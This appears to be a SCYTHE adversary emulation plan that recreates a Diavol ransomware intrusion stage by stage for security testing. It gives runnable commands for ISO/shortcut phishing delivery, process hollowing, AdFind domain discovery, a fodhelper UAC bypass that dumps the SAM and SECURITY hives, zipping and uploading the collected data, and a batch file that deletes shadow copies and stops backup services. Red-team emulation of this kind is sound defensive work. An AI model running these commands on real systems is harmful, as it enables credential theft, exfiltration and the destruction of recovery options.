# Diavol Ransomware - Adversary Emulation Plan

This threat is based on The DFIR Report post on December 13, 2021: https://thedfirreport.com/2021/12/13/diavol-ransomware/

This is a multi-stage threat that requires multiple SCYTHE campaigns for end-to-end execution. The initial access procedures leverage multiple defense evasion steps that would be wise to test in your enviornment.

## Automated Adversary Emulation with SCYTHE
### Diavol Stage 0
1. Download and import the threats in JSON format to your SCYTHE instance
2. Download the Virtual File System (VFS) files under Diavol/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/Diavol
4. Create a new campaign `DiavolStage0` with HTTPS and the communication options from the CTI. You can import from the config.json on this GitHub or manually set it to: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
5. Import from Existing Threat: DiavolStage0
6. Launch the Campaign
7. Download payload in DLL format setting the entry-point to `BasicScore`
8. Save the DLL as `SharedFiles.dll`
9. Start Stage 1, 2, 3, and 4 before execution
11. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system
12. Put the SCYTHE DLL in the Folder2Iso of the working directory
13. In the Folder2Iso directory, create a shortcut called `Documents` and set the `Target` to: `C:\Windows\System32\rundll32.exe SharedFiles.dll,BasicScore`
14. Open a Windows command prompt and cd to the working directory
15. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\new-documents-2005.iso" "Diavol" 0 0 0 "None"` This will take all the content of the Folder2Iso folder and create an ISO of it
16. Zip the ISO and call it `new-documents-2005.zip`
17. Upload the zip file to Microsoft OneDrive and copy the link
18. Send a phishing email with the link to the Microsoft OneDrive zip file
19. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.

### Diavol Stage 1
1. Create a new campaign `DiavolStage1` with HTTPS and the communication options from the CTI. You can import from the config.json on this GitHub or manually set it to: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
2. Import from Existing Threat: DiavolStage1
3. Launch the Campaign
4. Download payload in EXE format and save it as `DiavolStage1.exe`
5. Upload the `DiavolStage1.exe` to the VFS under VFS:/shared/Diavol

### Diavol Stage 2
1. Create a new campaign `DiavolStage2` with HTTPS and the communication options from the CTI. You can import from the config.json on this GitHub or manually set it to: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
2. Import from Existing Threat: DiavolStage2
3. Launch the Campaign
4. Download payload in DLL format setting the entry-point to `EnterDll`
5. Save the DLL as `tfpkuengdlu.dll`
6. Upload the `tfpkuengdlu.dll` to the VFS under VFS:/shared/Diavol

### Diavol Stage 3
1. Create a new campaign `DiavolStage3` with HTTPS and the communication options from the CTI. You can import from the config.json on this GitHub or manually set it to: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
2. Import from Existing Threat: DiavolStage3
3. Launch the Campaign
4. Download payload in DLL format setting the entry-point to `EnterDll`
5. Save the DLL as `uvvfvnnswte.dll`
6. Upload the `uvvfvnnswte.dll` to the VFS under VFS:/shared/Diavol

### Diavol Stage 4
1. Create a new campaign `DiavolStage4` with HTTPS and the communication options from the CTI. You can import from the config.json on this GitHub or manually set it to: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
2. Import from Existing Threat: DiavolStage4
3. Launch the Campaign
4. Download payload in EXE.
5. Save the EXE as `CryptoLocker64.exe`
6. Upload the `CryptoLocker64.exe` to the VFS under VFS:/shared/Diavol

## Manual Adversary Emulation
This is a multi-stage attack leveraging multiple payloads and execution that perform different TTPs. Manual emulation steps are below.

### Diavol Stage 0
1. Start a campaign, download the DLL with entry point of `BasicScore` and save as `ShareFiles.dll` 
2. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system.
3. Put the SCYTHE DLL in the Folder2Iso of the working directory.
4. In the Folder2Iso directory, create a shortcut called `Documents` and set the `Target` to: `C:\Windows\System32\rundll32.exe SharedFiles.dll,BasicScore`
5. Open a Windows command prompt and cd to the working directory.
6. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\new-documents-2005.iso" "Diavol" 0 0 0 "None"` This will take all the content of the Folder2Iso folder and create an ISO of it.
7. Zip the ISO and call it `new-documents-2005.zip`
8. Upload the zip file to Microsoft OneDrive and copy the link.
9. Send a phishing email with the link to the Microsoft OneDrive zip file. 
10. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.
11. Load the process hollowing module: ```loader --load scythe.phollowing```
12. Inject DiavolStage1 into msedge: ```scythe.phollowing --src VFS:/shared/Diavol/DiavolStage1.exe --target "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"```
13. Shutdown Diavol Stage 0: ```controller --shutdown```

### Diavol Stage 1
Manual execution of discovery activity started 14 minutes after initial access:
```
loader --load run
run net group /domain
run net group /domain "Domain Admins"
run net group "Domain Computers" /domain
run net localgroup administrators
run net view /all
run nltest /domain_trusts /all_trusts
```
59 minutes after discovery, another payload was dropped and executed: 
```
delay --time 6000
loader --load downloader
downloader --src "VFS:/shared/Diavol/tfpkuengdlu.dll" --dest "%USERPROFILE%\AppData\Local\Temp\tfpkuengdlu.dll"
run rundll32.exe "%USERPROFILE%\AppData\Local\Temp\tfpkuengdlu.dll",EnterDll
controller --shutdown
```

### Diavol Stage 2
Create adf.bat and upload to VFS:/shared/Diavol/adf.bat
```
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -f "(objectcategory=person)" > %USERPROFILE%\Desktop\Diavol\adfind\results\ad-users.txt
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -f "objectcategory=computer" > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_computers.txt
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -f "(objectcategory=organizationalUnit)" > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_ou.txt
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -sc trustdmp > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_trustdmp.txt
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -subnets -f (objectCategory=subnet) > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_subnet.txt
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -f "(objectcategory=group)" > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_group.txt
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -gcb -sc trustdmp > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_trustdmp2.txt
```
Create fodhelper_reg_hashes.bat  and upload to VFS:/shared/Diavol/fodhelper_reg_hashes.bat
```
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\sam c:\ProgramData\sam.save" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe

reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\security c:\ProgramData\security.save" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe

reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\system c:\ProgramData\system.save" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe

reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
```
In the shell:
```
loader --load run
run ipconfig /all
run net user USER /domain
run cmd.exe /c mkdir "%USERPROFILE%\Desktop\Diavol"
run cmd.exe /c mkdir "%USERPROFILE%\Desktop\Diavol\adfind"
run cmd.exe /c mkdir "%USERPROFILE%\Desktop\Diavol\adfind\results"
loader --load downloader
downloader --src "VFS:/shared/Diavol/adf.bat" --dest "%USERPROFILE%\Desktop\Diavol\adfind\adf.bat"
downloader --src "https://www.joeware.net/downloads/files/AdFind.zip" --dest "%USERPROFILE%\Desktop\Diavol\adfind\AdFind.zip"
run cmd /c powershell -Command Expand-Archive %USERPROFILE%\Desktop\Diavol\adfind\AdFind.zip -DestinationPath %USERPROFILE%\Desktop\Diavol\adfind\
run cmd /c "start %USERPROFILE%\Desktop\Diavol\adfind\adf.bat"
loader --load downloader
downloader --src "VFS:/shared/Diavol/fodhelper_reg_hashes.bat" --dest "%USERPROFILE%\Desktop\Diavol\fodhelper_reg_hashes.bat"
run cmd /c "start %USERPROFILE%\Desktop\Diavol\fodhelper_reg_hashes.bat"
run powershell Compress-Archive "%USERPROFILE%\Desktop\Diavol\adfind\results\" "%USERPROFILE%\Desktop\Diavol\adfind\adf.zip
loader --load uploader
uploader --remotepath "%USERPROFILE%\Desktop\Diavol\adfind\adf.zip"
run cmd /c rmdir /Q /S "%USERPROFILE%\Desktop\Diavol\adfind"
downloader --src "VFS:/shared/Diavol/uvvfvnnswte.dll" --dest "%USERPROFILE%\AppData\Local\Temp\uvvfvnnswte.dll"
run rundll32.exe "%USERPROFILE%\AppData\Local\Temp\uvvfvnnswte.dll",EnterDll
controller --shutdown
```

### Diavol Stage 3
After 18 hours, the following was executed:
```
loader --load run
run net group "Domain Admins" /domain
run whoami
run nslookup
run ipconfig /all
run systeminfo
run tasklist
run net group "Enterprise admins" /domain
run net localgroup administrators
run whoami /all
run net use
run query user
loader --load downloader
downloader --src "VFS:/shared/Diavol/CryptoLocker64.exe" --dest "C:\ProgramData\CryptoLocker64.exe"
run C:\ProgramData\CryptoLocker64.exe
controller --shutdown
```

### Diavol Stage 4
Create kill.bat and upload to VFS:/shared/Diavol/kill.bat
```
sc  config "Netbackup Legacy Network service" start= disabled
bcdedit  /set {default}
bcdedit  /set {default} recoveryenabled No 
vssadmin.exe  Delete Shadows /all /quiet
wmic.exe  Shadowcopy Delete
net  stop "Zoolz 2 Service" /y
net  stop "Veeam Backup Catalog Data Service" /y
net  stop "Symantec System Recovery" /y
net  stop "SQLsafe Filter Service" /y
net  stop "SQLsafe Backup Service" /y
net  stop "SQL Backups" /y
net  stop "Acronis VSS Provider" /y
net  stop VeeamDeploySvc /y
net  stop BackupExecVSSProvider /y
net  stop BackupExecRPCService /y
net  stop BackupExecManagementService /y
net  stop BackupExecJobEngine /y
net  stop BackupExecDeviceMediaService /y
```
Create README_FOR_DECRYPT.txt and upload to VFS:/shared/Diavol/README_FOR_DECRYPT.txt
```
This is an adversary emulation by SCYTHE. If this were a real threat actor, this would be a ransom note and your data would have been stolen and encrypted.
```
In the shell:
```
loader --load downloader
downloader --src "VFS:/shared/Diavol/kill.bat" --dest "%USERPROFILE%\Desktop\kill.bat"
loader --load run
run cmd /c "start %USERPROFILE%\kill.bat"
controller --shutdown
```